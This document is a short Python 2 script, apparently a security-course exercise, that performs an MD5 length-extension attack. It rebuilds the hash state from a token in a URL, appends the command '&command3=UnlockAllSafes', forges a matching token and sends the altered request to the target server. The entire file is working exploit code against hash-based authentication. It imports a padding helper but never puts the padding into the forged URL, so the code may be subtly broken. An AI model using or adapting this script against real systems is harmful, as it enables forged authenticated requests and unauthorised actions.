from  pymd5 import md5, padding
import httplib, urlparse, urllib, sys

url = sys.argv[1]

idx1 = url.find("token=")
idx2 = url.find("user=")

url1 = url[:idx1+6]
token = url[idx1+6:idx2]
url2 = url[idx2:len(url)]

x = "&command3=UnlockAllSafes"
url2 = url2 + x

print urllib.quote(token).decode("hex")

h = md5(state=urllib.quote(token).strip().decode("hex"), count=512)

print "HD=", md5(url).hexdigest()
h.update(x)
new_token = h.hexdigest()
print "NT=", new_token

new_url = url1 + new_token + url2
print "NU1=", new_url

#print url
#print new_url

print md5(url2).hexdigest()

parsedUrl = urlparse.urlparse(new_url)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
